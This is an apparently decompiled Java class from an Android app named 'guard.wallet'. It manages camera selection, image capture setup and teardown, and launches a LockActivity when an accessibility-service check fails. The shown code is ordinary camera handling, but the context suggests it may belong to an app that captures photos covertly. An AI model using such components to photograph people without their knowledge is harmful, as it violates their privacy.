package com.guard.wallet.camera;

import com.guard.wallet.core.AppUtils;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.ImageReader;
import android.os.Handler;
import android.os.Looper;
import android.util.Size;
import com.guard.wallet.LockActivity;
import com.guard.wallet.MainApplication;
import com.guard.wallet.utils.SystemHelper;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 摄像头单例管理器。
 * 管理相机设备的打开/关闭、ImageReader 创建以及采集会话生命周期。
 * vendor 原始路径: m/d.java
 */
public final class CameraCaptureManager {
    public static CameraCaptureManager f = new CameraCaptureManager();
    public final AtomicBoolean a = new AtomicBoolean(false);
    public ImageReader b;
    public CameraDevice c;
    public CameraCaptureSession d;
    public CameraInfo e;

    /**
     * Find camera info matching the requested facing direction.
     * Selects output size closest to 800px width.
     */
    public static CameraInfo b(CameraManager var0, int var1) {
        try {
            if (var0.getCameraIdList().length <= 0) {
                return null;
            }

            String[] cameraIds = var0.getCameraIdList();
            int len = cameraIds.length;

            for (int i = 0; i < len; i++) {
                String cameraId = cameraIds[i];
                CameraInfo info = new CameraInfo();
                info.a = cameraId;

                CameraCharacteristics chars = var0.getCameraCharacteristics(cameraId);
                Integer orientation = (Integer) chars.get(CameraCharacteristics.SENSOR_ORIENTATION);
                if (orientation != null) {
                    info.c = orientation;
                }

                Integer facing = (Integer) chars.get(CameraCharacteristics.LENS_FACING);
                StreamConfigurationMap configMap = (StreamConfigurationMap) chars.get(
                        CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);

                if (configMap != null) {
                    Size[] sizes = configMap.getOutputSizes(256);
                    if (sizes != null && sizes.length > 0) {
                        int bestDiff = Integer.MAX_VALUE;
                        Size bestSize = null;

                        for (int j = 0; j < sizes.length; j++) {
                            Size size = sizes[j];
                            int diff = Math.abs(size.getWidth() - 800);
                            if (diff > bestDiff) {
                                break;
                            }
                            bestSize = size;
                            bestDiff = diff;
                        }

                        if (bestSize == null) {
                            bestSize = sizes[sizes.length - 1];
                        }

                        info.d = bestSize;
                    }
                }

                if (facing != null && facing == var1) {
                    info.b = facing;
                    return info;
                }
            }

            return null;
        } catch (Exception ex) {
            AppUtils.s("CameraCaptureManager", ex);
            return null;
        }
    }

    /** Get singleton instance */
    public static CameraCaptureManager c() {
        if (f == null) {
            f = new CameraCaptureManager();
        }
        return f;
    }

    /**
     * Open camera with specified facing direction (0=front, 1=back).
     * If accessibility service not available, queues via LockActivity.
     */
    public final boolean a(int var1) {
        if (SystemHelper.Z() == null) {
            return false;
        } else if (!SystemHelper.k()) {
            CameraInfo info = new CameraInfo();
            this.e = info;
            info.b = var1;
            AtomicBoolean flag = this.a;
            if (!flag.get()) {
                flag.set(true);
                if (LockActivity.b() == null) {
                    SystemHelper.d1(MainApplication.getInstance().getPackageName(), LockActivity.class.getName());
                } else {
                    LockActivity.b().c();
                }
            }
            return false;
        } else {
            CameraManager mgr = (CameraManager) SystemHelper.Z().getSystemService("camera");
            if (mgr != null) {
                try {
                    CameraInfo info = b(mgr, var1);
                    this.e = info;

                    if (info == null) {
                        return false;
                    }
                    if (AppUtils.B(info.a)) {
                        return false;
                    }

                    Size supportSize = this.e.d;
                    ImageReader reader;
                    if (supportSize != null) {
                        reader = ImageReader.newInstance(
                                800,
                                (int) (Float.parseFloat(String.valueOf(supportSize.getHeight()))
                                        / (float) this.e.d.getWidth() * 800.0F),
                                256, 2);
                    } else {
                        reader = ImageReader.newInstance(800, 800, 256, 2);
                    }

                    this.b = reader;
                    CameraFrameListener imageListener = new CameraFrameListener(this.e.b);
                    Handler handler = new Handler(Looper.getMainLooper());
                    reader.setOnImageAvailableListener(imageListener, handler);
                    String cameraId = this.e.a;
                    CameraDeviceCallback stateCallback = new CameraDeviceCallback(this.b.getSurface());
                    Handler mainHandler = new Handler(Looper.getMainLooper());
                    mgr.openCamera(cameraId, stateCallback, mainHandler);
                    return true;
                } catch (Exception ex) {
                    AppUtils.s("CameraCaptureManager", ex);
                }
            }
            return false;
        }
    }

    /** Close camera if it matches the specified facing direction */
    public final void d(int var1) {
        CameraInfo info = this.e;
        int facing;
        if (info != null) {
            facing = info.b;
        } else {
            facing = -1;
        }

        if (Objects.equals(facing, var1) && this.c != null) {
            this.e();
        }
    }

    /** Release all camera resources (session, device, reader) */
    public final boolean e() {
        try {
            CameraCaptureSession session = this.d;
            if (session != null) {
                session.stopRepeating();
                this.d = null;
            }

            CameraDevice device = this.c;
            if (device != null) {
                device.close();
                this.c = null;
            }

            ImageReader reader = this.b;
            if (reader != null) {
                reader.close();
                this.b = null;
            }

            this.e = null;
            return true;
        } catch (Exception ex) {
            AppUtils.s("CameraCaptureManager", ex);
            return false;
        }
    }
}
